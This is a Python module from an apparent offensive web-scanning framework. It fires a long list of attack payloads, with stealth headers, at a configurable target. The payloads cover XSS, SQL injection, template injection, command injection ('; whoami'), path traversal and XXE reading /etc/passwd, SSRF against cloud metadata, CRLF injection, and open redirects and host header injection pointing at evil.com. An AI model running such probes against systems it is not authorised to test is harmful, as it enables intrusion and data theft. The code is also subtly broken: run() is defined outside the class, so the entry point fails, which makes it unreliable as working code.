"""
Asgard Framework Module
Copyright (c) 2025 The Divinity Project

This module is part of the Asgard Framework. Use is subject to the MIT License
and the disclaimer outlined in LICENSE_Asgard_Framework_Expanded.txt.

Unauthorized or unethical use is strictly prohibited and may violate international law.
Visit: https://opensource.org/licenses/MIT

This file is distributed with ABSOLUTELY NO WARRANTY. Use at your own risk.
"""

import requests
import os
import json
from bs4 import BeautifulSoup
from yggdrasil.intel_manager import IntelManager
from yggdrasil.stealth_tools import StealthTools

class FreyaAlpha:
    def __init__(self):
        self.target = os.getenv("ASGARD_TARGET", "http://localhost")
        self.report_dir = os.getenv("ASGARD_REPORTS_DIR", "./reports")
        self.intel = IntelManager(self.report_dir)
        self.stealth = StealthTools()
        self.results = {"xss": [], "sqli": [], "rce": [], "ssti": []}
        self.session = requests.Session()

    def get_forms(self, url):
        try:
            r = self.session.get(url, headers=self.stealth.get_headers(), timeout=10)
            soup = BeautifulSoup(r.text, "html.parser")
            return soup.find_all("form")
        except:
            return []

    def test_xss(self, url, form):
        payload = "<script>alert(1)</script>"
        action = form.get("action") or url
        post_url = action if action.startswith("http") else f"{self.target}/{action}".rstrip("/")
        data = {}
        for input in form.find_all("input"):
            name = input.get("name")
            if name:
                data[name] = payload
        try:
            r = self.session.post(post_url, data=data, headers=self.stealth.get_headers(), timeout=10)
            if payload in r.text:
                self.results["xss"].append(post_url)
                self.intel.add("freya", "xss", True)
        except:
            pass

    def test_sqli(self, url):
        payload = "' OR '1'='1"
        try:
            r = self.session.get(url + "?id=" + payload, headers=self.stealth.get_headers(), timeout=10)
            if "sql" in r.text.lower() or "syntax" in r.text.lower():
                self.results["sqli"].append(url)
                self.intel.add("freya", "sqli", True)
        except:
            pass

    def test_ssti(self, url):
        payload = "{{7*7}}"
        try:
            r = self.session.get(url + "?name=" + payload, headers=self.stealth.get_headers(), timeout=10)
            if "49" in r.text:
                self.results["ssti"].append(url)
                self.intel.add("freya", "ssti", True)
        except:
            pass

    def test_rce(self, url):
        payload = "; whoami"
        try:
            r = self.session.get(url + "?cmd=" + payload, headers=self.stealth.get_headers(), timeout=10)
            if any(k in r.text for k in ["root", "admin", "user"]):
                self.results["rce"].append(url)
                self.intel.add("freya", "rce", True)
        except:
            pass

    
    def test_path_traversal(self):
        payloads = ["../../../../etc/passwd", "..\..\..\..\windows\win.ini"]
        for payload in payloads:
            test_url = f"{self.target}?file={payload}"
            try:
                r = self.session.get(test_url, headers=self.stealth.get_headers(), timeout=10)
                if "root:" in r.text or "[extensions]" in r.text.lower():
                    self.results["path_traversal"] = test_url
                    self.intel.add("freya", "path_traversal", True)
                    break
            except:
                continue


    def test_csrf(self, url, form):
        has_token = False
        for input in form.find_all("input"):
            name = input.get("name", "").lower()
            if "csrf" in name or "token" in name:
                has_token = True
                break
        if not has_token:
            self.results.setdefault("csrf_issues", []).append(url)
            self.intel.add("freya", "csrf", True)


    def test_ssrf(self):
        ssrf_payloads = [
            "http://127.0.0.1", "http://localhost", "http://169.254.169.254", "http://[::1]"
        ]
        for payload in ssrf_payloads:
            try:
                r = self.session.get(f"{self.target}?url={payload}", headers=self.stealth.get_headers(), timeout=10)
                if "root:" in r.text or "EC2" in r.text or "metadata" in r.text:
                    self.results.setdefault("ssrf", []).append(payload)
                    self.intel.add("freya", "ssrf", True)
            except:
                continue


    def test_idor(self):
        idor_paths = [
            f"{self.target}/profile?id=1",
            f"{self.target}/account?id=2",
            f"{self.target}/user?id=3"
        ]
        headers = self.stealth.get_headers()
        for path in idor_paths:
            try:
                r = self.session.get(path, headers=headers, timeout=10)
                if any(x in r.text.lower() for x in ["email", "address", "username", "ssn", "account"]):
                    self.results.setdefault("idor", []).append(path)
                    self.intel.add("freya", "idor", True)
            except:
                continue


    def test_open_redirect(self):
        payloads = ["https://evil.com", "//evil.com", "///evil.com"]
        for payload in payloads:
            test_url = f"{self.target}?redirect={payload}"
            try:
                r = self.session.get(test_url, headers=self.stealth.get_headers(), allow_redirects=False, timeout=10)
                loc = r.headers.get("Location", "")
                if payload in loc:
                    self.results.setdefault("open_redirect", []).append(test_url)
                    self.intel.add("freya", "open_redirect", True)
            except:
                continue


    def test_xxe(self):
        xml_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root ANY >
<!ENTITY test SYSTEM "file:///etc/passwd" >]>
<root>&test;</root>'''
        headers = self.stealth.get_headers()
        headers["Content-Type"] = "application/xml"
        try:
            r = self.session.post(self.target, data=xml_payload, headers=headers, timeout=10)
            if "root:" in r.text or "daemon" in r.text:
                self.results.setdefault("xxe", []).append(self.target)
                self.intel.add("freya", "xxe", True)
        except:
            pass


    def test_crlf_injection(self):
        payloads = [
            "%0d%0aSet-Cookie:crlf=crlf_injected", 
            "%0d%0aLocation:%20http://evil.com"
        ]
        for payload in payloads:
            test_url = f"{self.target}?input={payload}"
            try:
                r = self.session.get(test_url, headers=self.stealth.get_headers(), timeout=10)
                if "crlf_injected" in r.headers.get("Set-Cookie", "") or "evil.com" in r.headers.get("Location", ""):
                    self.results.setdefault("crlf", []).append(test_url)
                    self.intel.add("freya", "crlf", True)
            except:
                continue


    def test_http_verb_tampering(self):
        methods = ["PUT", "DELETE", "TRACE", "OPTIONS"]
        for method in methods:
            try:
                req = requests.request(method, self.target, headers=self.stealth.get_headers(), timeout=10)
                if req.status_code not in [403, 405, 501]:
                    self.results.setdefault("http_verb_tampering", []).append(f"{method} allowed")
                    self.intel.add("freya", "http_verb_tampering", True)
            except:
                continue


    def test_host_header_injection(self):
        headers = self.stealth.get_headers()
        headers["Host"] = "evil.com"
        try:
            r = self.session.get(self.target, headers=headers, timeout=10)
            if "evil.com" in r.text or "evil.com" in r.headers.get("Location", ""):
                self.results.setdefault("host_header_injection", []).append(self.target)
                self.intel.add("freya", "host_header_injection", True)
        except:
            pass


    def test_websocket_fuzzing(self):
        try:
            ws_headers = self.stealth.get_headers()
            ws_headers["Connection"] = "Upgrade"
            ws_headers["Upgrade"] = "websocket"
            r = self.session.get(self.target, headers=ws_headers, timeout=10)
            if r.status_code in [101, 400, 426] or "websocket" in r.headers.get("Upgrade", "").lower():
                self.results.setdefault("websocket_fuzzing", []).append(self.target)
                self.intel.add("freya", "websocket", True)
        except:
            pass


    def test_auth_bypass(self):
        unauth_headers = self.stealth.get_headers()
        unauth_headers["Authorization"] = "Bearer invalidtoken123"
        try:
            r = self.session.get(self.target, headers=unauth_headers, timeout=10)
            if r.status_code in [200, 302] and "logout" in r.text.lower():
                self.results.setdefault("auth_bypass", []).append(self.target)
                self.intel.add("freya", "auth_bypass", True)
        except:
            pass

    def test_oauth_misconfig(self):
        try:
            urls = [
                f"{self.target}/.well-known/openid-configuration",
                f"{self.target}/.well-known/oauth-authorization-server"
            ]
            for url in urls:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and "issuer" in r.text:
                    self.results.setdefault("oauth_misconfig", []).append(url)
                    self.intel.add("freya", "oauth", True)
        except:
            pass

def run(self):
        print("[+] Freya Alpha scanning:", self.target)
        forms = self.get_forms(self.target)
        for form in forms:
            self.test_csrf(self.target, form)
            self.test_xss(self.target, form)

        self.test_sqli(self.target)
        self.test_ssti(self.target)
        self.test_rce(self.target)
        self.test_path_traversal()
        self.test_ssrf()
        self.test_idor()
        self.test_open_redirect()
        self.test_xxe()
        self.test_crlf_injection()
        self.test_http_verb_tampering()
        self.test_host_header_injection()
        self.test_websocket_fuzzing()
        self.test_auth_bypass()
        self.test_oauth_misconfig()

        os.makedirs(self.report_dir, exist_ok=True)
        with open(os.path.join(self.report_dir, "freya_alpha_results.json"), "w") as f:
            json.dump(self.results, f, indent=2)
        print("[+] Freya Alpha complete. Results saved.")

if __name__ == "__main__":
    FreyaAlpha().run()
